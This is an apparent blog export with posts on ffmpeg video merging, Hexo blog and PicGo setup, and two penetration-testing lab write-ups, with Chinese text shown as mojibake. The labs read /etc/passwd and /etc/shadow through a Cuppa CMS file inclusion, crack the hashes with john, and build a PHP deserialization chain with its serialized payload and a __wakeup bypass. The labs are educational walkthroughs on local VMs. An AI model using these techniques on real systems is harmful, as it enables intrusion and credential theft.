<p>åœ¨linuxä¸­é‡å‘½åï¼ˆæ›´æ–¹ä¾¿ï¼Œé‡å‘½åä¸º1-xçš„é¡ºåºï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052001576.png" alt="image-20221105200145494"></p>
<p>è¿™æ ·é€‰æ‹©ï¼Œâ€œæ–‡å­—â€ç•™ç©ºï¼Œâ€œæ–‡å­—æ ¼å¼â€é€‰æ‹©â€œæ•°å­—-æ–‡å­—â€ï¼Œç¡®ä¿æ–°åç§°ä¸ºç±»ä¼¼01.flvçš„æœ‰é¡ºåºçš„åå­—</p>
<p>åœ¨å½“å‰æ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for f in *.flv; do echo &quot;file &#x27;$f&#x27;&quot; &gt;&gt; mylist.txt; done</span><br></pre></td></tr></table></figure>

<p>ä¼šæœ‰å¦‚ä¸‹çš„txtæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052005882.png" alt="image-20221105200531854"></p>
<p>ç„¶åç»§ç»­åœ¨ç»ˆç«¯è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffmpeg -f concat -i mylist.txt -c copy output.flv</span><br></pre></td></tr></table></figure>

<p>ç­‰å¾…å®Œæˆï¼Œoutput.flvå³ä¸ºåˆå¹¶åçš„æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052013802.png" alt="image-20221105201307761"></p>
]]></content>
      <categories>
        <category>æ€ªä¸œè¥¿</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title>æ­å»ºåšå®¢</title>
    <url>/2022/11/21/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="Githubæ“ä½œ"><a href="#Githubæ“ä½œ" class="headerlink" title="Githubæ“ä½œ"></a>Githubæ“ä½œ</h3><p>å…ˆç”³è¯·ä¸€ä¸ªåå­—ä¸º <code>&lt;username&gt;.github.io</code> çš„<strong>å…¬å¼€</strong>ä»“åº“ï¼Œreadme.mdéšæ„åŠ ä¸åŠ </p>
<p>ç„¶ågit bashç»‘å®šä¸€ä¸‹è‡ªå·±çš„è´¦å·ï¼Œå…·ä½“ç™¾åº¦ä¸€å †</p>
<h3 id="æœ¬åœ°æ“ä½œ"><a href="#æœ¬åœ°æ“ä½œ" class="headerlink" title="æœ¬åœ°æ“ä½œ"></a>æœ¬åœ°æ“ä½œ</h3><p>å®‰è£…ä¸€ä¸‹hexoçš„ä¾èµ–ï¼šnode.jså’Œgit</p>
<p>æ‰¾ä¸ªåœ°æ–°å»ºæ–‡ä»¶å¤¹ï¼Œåœ¨æ–‡ä»¶å¤¹å†…å³é”®æ‰“å¼€git bash</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162050819.png" alt="image-20221016205042788"></p>
<p>ç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å®‰è£… hexo æ¡†æ¶</span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"># åˆå§‹åŒ–æ–‡ä»¶å¤¹</span><br><span class="line">hexo init</span><br><span class="line"># å®‰è£… hexo ä¾èµ–åŒ…</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>ï¼ˆhexo initå¯èƒ½ä¼šå¡åœ¨å®‰è£…ä¾èµ–ä¸Šï¼ŒæŒ‚ä¸ªæ¢¯å­ï¼Œgitä¸Šè®¾ç½®ä¸€ä¸‹ä»£ç†ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># è®¾ç½®ä»£ç†</span><br><span class="line">git config --global http.proxy http://serverip:port</span><br><span class="line">git config --global https.proxy http:/serverip:port</span><br><span class="line"># è®¾ç½®å¸¦ç”¨æˆ·åå¯†ç çš„ä»£ç†</span><br><span class="line"># æ³¨æ„ï¼šå¦‚æœå¯†ç ä¸­å¸¦äº†ç‰¹æ®Šå­—ç¬¦éœ€è¦è¿›è¡Œè½¬ä¹‰, å°†ç‰¹æ®Šå­—ç¬¦æ›¿æ¢ä¸ºä¸‹é¢å¯¹åº”çš„è½¬ä¹‰å­—ç¬¦å³å¯</span><br><span class="line">#  !   #   $   &amp;   &#x27;   (    )  *   +   ,   /   :   ;   =   ?   @   [   ]</span><br><span class="line"># %21 %23 %24 %26 %27 %28 %29 %2A %2B %2C %2F %3A %3B %3D %3F %40 %5B %5D</span><br><span class="line">npm config set proxy http://username:password@serverip:port</span><br><span class="line">npm confit set https-proxy http://username:password@serverip:port</span><br><span class="line"># å–æ¶ˆä»£ç†</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œæˆä¹‹åï¼Œç›®å½•å¤§æ¦‚æ˜¯è¿™æ ·çš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162031068.png" alt="image-20221016203139039"></p>
<p>ç„¶ååœ¨è¿™ä¸ªç›®å½•ä¸‹ç”¨<code>cmd/git bash/powershell</code>æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ç”Ÿæˆé™æ€ç½‘ç«™</span><br><span class="line">hexo g</span><br><span class="line"># å¯åŠ¨æœåŠ¡å™¨</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<code>http://localhost:4000/</code>æµ‹è¯•æ˜¯å¦æˆåŠŸ</p>
<p>æˆåŠŸä¹‹åå®‰è£…ä¸€ä¸‹å‘å¸ƒæ’ä»¶</p>
<p>åœ¨git bashé‡Œè¾“å…¥<code>npm install hexo-deployer-git</code>ï¼Œå®‰è£…å®Œé…ç½®ä¸€ä¸‹æ ¹ç›®å½•ä¸‹<code>_config.yml</code>çš„æ–‡ä»¶ï¼Œåœ¨deployä¸€æ å¡«ä¸€ä¸‹å‘å¸ƒçš„ç±»å‹ï¼Œç”³è¯·çš„ä»“åº“åœ°å€ï¼Œåˆ†æ”¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162043684.png" alt="image-20221016204336663"></p>
<h3 id="å‘å¸ƒ"><a href="#å‘å¸ƒ" class="headerlink" title="å‘å¸ƒ"></a>å‘å¸ƒ</h3><p>æ‰§è¡Œä¸€ä¸‹<code>hexo d</code>å°±å‘å¸ƒå¥½äº†ï¼ˆæ¯æ¬¡é‡æ–°å‘å¸ƒè®°å¾—<code>hexo clea &amp;&amp; hexo g</code>é‡å»ºä¸€ä¸‹ï¼‰</p>
<h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>å›½å†…ç½‘çœŸæ˜¯å“ˆå“ˆäº†ï¼Œå¹²å•¥éƒ½è¦æŒ‚æ¢¯å­ã€æ¢æºï¼Œæœ‰é—®é¢˜ç™¾åº¦+googleç„¶åC+Vå°±å®Œäº‹äº†</p>
]]></content>
      <categories>
        <category>é…ç½®</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>æ­å»ºå›¾åºŠ</title>
    <url>/2022/11/21/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><h4 id="ä»“åº“"><a href="#ä»“åº“" class="headerlink" title="ä»“åº“"></a>ä»“åº“</h4><p>å…ˆåœ¨githubä¸Šç”³è¯·ä¸€ä¸ª<strong>å…¬å¼€</strong>ä»“åº“</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162108241.png" alt="image-20221016210831200"></p>
<p>éšä¾¿å¡«ä¸€å¡«ç„¶åç”³è¯·ï¼Œè®°ä¸‹æ¥ä»“åº“åå­—</p>
<h4 id="ç”³è¯·Token"><a href="#ç”³è¯·Token" class="headerlink" title="ç”³è¯·Token"></a>ç”³è¯·Token</h4><p>githubä¸­ç‚¹å¼€Setting-Developer settings</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162113745.png" alt="image-20221016211329717"></p>
<p>å·¦ä¾§é€‰æ‹©Personal access tokens</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162114646.png" alt="image-20221016211407617"></p>
<p>æƒé™é‡Œå…¨é€‰æ‹©repoï¼Œç„¶åç”Ÿæˆtokenï¼Œè®°ä¸‹ç»™å‡ºæ¥çš„token</p>
<h2 id="Pic-Go"><a href="#Pic-Go" class="headerlink" title="Pic Go"></a>Pic Go</h2><p>ä¸‹è½½ä¸€ä¸ªPicGoï¼š<code>https://github.com/Molunerfinn/picgo/releases</code></p>
<p>ä¸‹è½½ä¹‹ååœ¨å›¾åºŠè®¾ç½®-Githubä¸­å¦‚ä¸‹è®¾ç½®</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162115272.png" alt="image-20221016211527242"></p>
<p>ä»“åº“åé€‰æ‹©åˆšåˆšç”³è¯·çš„ä»“åº“ï¼Œåˆ†æ”¯å¡«master&#x2F;mainï¼Œtokenå¡«åˆšåˆšç”³è¯·çš„token</p>
<p>å›½å†…è®¿é—®æ…¢çš„è¯å¯ä»¥ç”¨jsdelivrçš„åŠ é€ŸæœåŠ¡ï¼Œå…·ä½“ç™¾åº¦</p>
<p>å¡«å®Œç‚¹é€‰ç¡®å®šå°±å¥½äº†</p>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>åœ¨åå¥½è®¾ç½®-å›¾åƒè®¾ç½®é‡Œå¦‚ä¸‹è®¾ç½®</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162117765.png" alt="image-20221016211742739"></p>
<p>ä¸Šä¼ æœåŠ¡é€‰PicGo(app)ï¼Œè·¯å¾„é€‰æ‹©PicGoçš„å®‰è£…ç›®å½•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162118544.png" alt="image-20221016211820516"></p>
<p>è¿™æ ·è®¾ç½®çš„è¯æ¯æ¬¡æ‹–æ”¾å›¾ç‰‡å°±å¯ä»¥è‡ªåŠ¨è°ƒç”¨PicGoä¸Šä¼ </p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä¸å¾—ä¸è¯´ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯å›½å†…ç½‘çš„é—®é¢˜ï¼Œtyporaè®¾ç½®äº†ä»£ç†æ‰èƒ½æ˜¾ç¤ºå›¾ç‰‡ï¼Œä½†picgoé‡Œå°±ç®—ä»£ç†äº†ä¹Ÿæ²¡æ³•åŠ è½½å›¾ç‰‡ï¼Œä¸çŸ¥é“å•¥æƒ…å†µ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162121720.png" alt="image-20221016212153691"></p>
<p>çœŸè¦ç‰ç‰äº†</p>
]]></content>
      <categories>
        <category>é…ç½®</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€-W1R3S</title>
    <url>/2022/02/27/%E6%B8%97%E9%80%8F-W1R3S/</url>
    <content><![CDATA[<p>ç”±äºé¶æœºå’Œæ”»å‡»æœºæˆ‘éƒ½è®¾ç½®çš„æ˜¯natï¼Œå¤„åœ¨åŒä¸€ä¸ªç½‘å…³ä¸‹ï¼Œæ‰€ä»¥ç›´æ¥ç”¨nmapæ‰¾ä¸€ä¸‹é¶æœºçš„ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849611.png" alt="image-20230104152533315"></p>
<p>çŒœæµ‹æ˜¯130ï¼Œå†ç”¨nmapå…¨æ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“çš„ç‰ˆæœ¬ä¿¡æ¯ã€å¼€æ”¾ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.130</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849989.png" alt="image-20230104155143068"></p>
<p>æ˜¾ç„¶ï¼Œå¼€äº†å››ä¸ªç«¯å£:21,22,80,3306</p>
<p>å…¶ä¸­ï¼Œftpçš„21ç«¯å£å¯ä»¥åŒ¿åç™»é™†ï¼Œé‡Œè¾¹çš„æ–‡ä»¶å¯èƒ½æœ‰ç”¨ï¼›sshçš„22ç«¯å£å¯ä»¥çˆ†ç ´ä¸€ä¸‹ç”¨æˆ·å¯†ç ï¼›80ç«¯å£ç»™çš„ç½‘é¡µï¼Œå¯èƒ½æœ‰æ¼æ´æˆ–è€…ä¸­é—´ä»¶å¯ä»¥æ”»å‡»ï¼›3306æ•°æ®åº“å¯èƒ½æ³„éœ²</p>
<p>å…ˆè¯•ä¸€ä¸‹ftp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 192.168.11.130</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849045.png" alt="image-20230104160041435"></p>
<p>æŠŠæ‰€æœ‰æ–‡ä»¶æ‰’åˆ°æœ¬åœ°è¯•è¯•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849690.png" alt="image-20230104160005641"></p>
<p>å¥½åƒåªæœ‰02.txtæœ‰ç‚¹ä¸œè¥¿</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849893.png" alt="image-20230104160207387"></p>
<p>ä½†base64è§£å‡ºæ¥å•¥éƒ½ä¸æ˜¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849837.png" alt="image-20230104160236230"></p>
<p>æ—¢ç„¶ftpèµ°ä¸äº†ï¼Œsshä¹Ÿæ²¡å•¥æ€è·¯ï¼Œé‚£å°±è¯•è¯•web</p>
<p>çœ‹åˆ°apache2.4.18ï¼Œæƒ³åˆ°æ–°ç”Ÿèµ›çš„ä¸­é—´ä»¶æ”»å‡»ï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œåªèƒ½æ”¾å¼ƒä¸­é—´ä»¶</p>
<p>dirbæ‰«ä¸€ä¸‹</p>
<p>æ‰«åˆ°ä¸€å †&#x2F;administrator&#x2F;å’Œ&#x2F;wordpress&#x2F;çš„ç½‘å€ï¼Œè®¿é—®çœ‹çœ‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849754.png" alt="image-20230104161157828"></p>
<p>æ˜¯ä¸€ä¸ªcuppa cmsæ¡†æ¶çš„å®‰è£…ç•Œé¢</p>
<p>å†æ‰¾æ‰¾cuppa cmsæœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849443.png" alt="image-20230104161347544"></p>
<p>åªæ‰¾åˆ°ä¸€ä¸ªï¼Œå¤åˆ¶å‡ºæ¥çœ‹çœ‹å…·ä½“æ€ä¹ˆå®ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 25971.txt</span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>

<p>çœ‹å¾—åˆ°è¿™ä¸ªæ¼æ´çš„æ‰“æ³•ï¼Œå†™çš„æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´è¯»å–éphpæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849433.png" alt="image-20230104161538221"></p>
<p>å‚è€ƒé¢˜ç›®çš„æç¤ºï¼Œé‚£å°±å¾ˆæ˜æ˜¾äº†ï¼Œ è¯•ç€è¯»å–ç™»é™†ç”¨æˆ·ï¼Œçˆ†ç ´å¯†ç ï¼Œç„¶åä¹‹å‰æ‰¾åˆ°çš„sshå°±æœ‰ç”¨äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849441.png" alt="image-20230104164506537"></p>
<p>æŠŠtarget&#x2F;cuppaæ”¹æˆåˆšåˆšæ‰¾åˆ°ip&#x2F;administrator&#x2F;çš„è¾“ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849444.png" alt="image-20230104162153636"></p>
<p>æ²¡å›æ˜¾</p>
<p>æ¢ç”¨burpsuiteå‘ä¸ªpostè¯•è¯•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849447.png" alt="image-20230104164127035"></p>
<p>æ‹¿åˆ°passwdä¿¡æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849451.png" alt="image-20230104164144631"></p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªç‰¹åˆ«çš„ç”¨æˆ·ï¼šw1r3s</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849343.png" alt="image-20230104164639537"></p>
<p>å†è¯»ä¸€ä¸‹shadow</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849493.png" alt="image-20230104165656963"></p>
<p>å­˜åˆ°pass.txté‡Œï¼Œå‚è€ƒ<a href="https://blog.csdn.net/weixin_46447549/article/details/121301645">Linuxå¯†ç ç ´è§£ï¼ˆä½¿ç”¨hydraå·¥å…·å’Œä½¿ç”¨johnæš´åŠ›ç ´è§£ï¼‰_å›½é™…çŸ¥åè§‚ä¼—çš„åšå®¢-CSDNåšå®¢_linux hydra</a></p>
<p>ç”¨johnçˆ†ç ´</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849950.png" alt="image-20230104170005275"></p>
<p>æ‹¿åˆ°å¯†ç å’Œç”¨æˆ·åï¼Œå†sshç™»é™†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181850745.png" alt="image-20230104170238620"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su </span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°rootæƒé™</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849287.png" alt="image-20230104170710939"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>è€ƒæ ¸-æ¸—é€</title>
    <url>/2022/02/18/%E8%80%83%E6%A0%B8-%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>å…ˆæ‰«ç½‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831033.png" alt="image-20230124005329665"></p>
<p>é¶æœºæ˜¯192.168.11.131</p>
<p>æ‰«ä¸€ä¸‹ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.131</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831748.png" alt="image-20230124005825745"></p>
<p>åªå¼€äº†22å’Œ80ä¸¤ä¸ªç†Ÿæ‚‰çš„ç«¯å£å’Œ5355</p>
<p>è®¿é—®80</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b1-&gt;<span class="title function_ invoke__">web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸è®¸ååºåˆ—åŒ–å“¦&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1 . <span class="string">&#x27;  --0xfa&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;r1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome to this game, hope you have a great day&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;c1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>dirsearchçˆ†äº†ä¸€ä¸‹åªæœ‰flag.phpï¼Œé‚£å°±åªèƒ½ååºåˆ—åŒ–äº†</p>
<p>å…ˆçœ‹ä¸€ä¸‹è¾“å…¥ç‚¹ï¼Œåœ¨index.phpä¸­ç”¨postæ–¹æ³•ä¼ å…¥cmdä¸­</p>
<p>è€Œæœ€ååº”è¯¥åˆ©ç”¨ctfç±»ä¸­çš„getFlagå‡½æ•°ï¼Œechoå‡ºflag</p>
<p>1.è¦è°ƒç”¨getFlagï¼Œå¾—ä»pwnç±»ä¸­çš„__callæ–¹æ³•è¿›å…¥</p>
<p>2.è¦è¿›å…¥pwnä¸­çš„__callæ–¹æ³•ï¼Œå°±è¦é€šè¿‡webç±»ä¸­__invoke()ä¸‹çš„$this-&gt;b1-&gt;web()ï¼Œä»¤$this-&gt;b1&#x3D;new pwn()ï¼Œä½¿å¾—web()æ–¹æ³•æˆä¸ºä¸å¯ç”¨çš„æ–¹æ³•è¿›å…¥__callä¸­</p>
<p>3.è¦è¿›å…¥webç±»ä¸­__invoke()ï¼Œå°±è¦æŠŠwebå½“æˆä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå¯ä»¥åœ¨ctfç±»ä¸­ä½¿ç”¨execute()å‡½æ•°</p>
<p>4.è¿›å…¥ctfç±»çš„execute()å‡½æ•°ï¼Œå¯ä»¥ä»miscä¸‹çš„__toString()æ–¹æ³•è¿›å…¥</p>
<p>5.è¦ä½¿ç”¨__toString()æ–¹æ³•ï¼Œéœ€è¦ä»pwnç±»ä¸‹__destruct()æ–¹æ³•ä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥å®ç°</p>
<p>æ‰€ä»¥ååºåˆ—åŒ–é“¾ï¼š</p>
<p>unserializeååºåˆ—åŒ–-&gt;pwnä¸‹çš„__destruct()æ–¹æ³•-&gt;miscä¸‹çš„__toString()æ–¹æ³•-&gt;ctfä¸‹çš„execute()å‡½æ•°-&gt;ç»•è¿‡webä¸‹çš„__wakeup()æ–¹æ³•-&gt;webä¸‹çš„__invoke()æ–¹æ³•-&gt;pwnä¸‹çš„__call()æ–¹æ³•-&gt;ctfä¸‹çš„getFlag()å‡½æ•°</p>
<p>æ„é€ :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new pwn();</span><br><span class="line">$a-&gt;r1=new misc();</span><br><span class="line">$a-&gt;r1-&gt;w=new ctf();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1=new web();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1=new pwn();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1-&gt;r1=new ctf();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åºåˆ—åçš„å€¼ï¼šO:3:â€pwnâ€:1:{s:2:â€r1â€;O:4:â€miscâ€:1:{s:1:â€wâ€;O:3:â€ctfâ€:1:{s:2:â€c1â€;O:3:â€webâ€:1:{s:2:â€b1â€;O:3:â€pwnâ€:1:{s:2:â€r1â€;O:3:â€ctfâ€:1:{s:2:â€c1â€;N;}}}}}}</p>
<p>webåçš„1æ”¹ä¸º2ç»•è¿‡__wakeup()ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832929.png" alt="image-20230125003958905"></p>
<p>è®¿é—®ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832523.png" alt="image-20230125004033786"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.11.131/Redr/oCk/Login.php</span><br></pre></td></tr></table></figure>



<p>ä¸­é—´ä»¶æ˜¯apache2.4.18ï¼Œæ²¡æ‰¾åˆ°æ¼æ´åˆ©ç”¨</p>
<p>dirsearchæ‰«äº†ä¸€ä¸‹ç›®å½•ï¼Œè¯•äº†ä¸€ä¸‹åˆ©ç”¨ä¸å¤ªåˆ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832088.png" alt="image-20230125023004286"></p>
<p>åœ¨ç™»é™†æ¡†æ‰“â€™è¯•è¯•èƒ½ä¸èƒ½sqlæ³¨å…¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832748.png" alt="image-20230125140418486"></p>
<p>èƒ½æ³¨å…¥ï¼Œä½†æ²¡æœ‰å›æ˜¾ï¼Œä¸æ–¹ä¾¿æ‰‹æ³¨</p>
<p>ç›´æ¥ä¸Šsqlmap</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832574.png" alt="image-20230125152718588"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832584.png" alt="image-20230125152729262"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832096.png" alt="image-20230125152740313"></p>
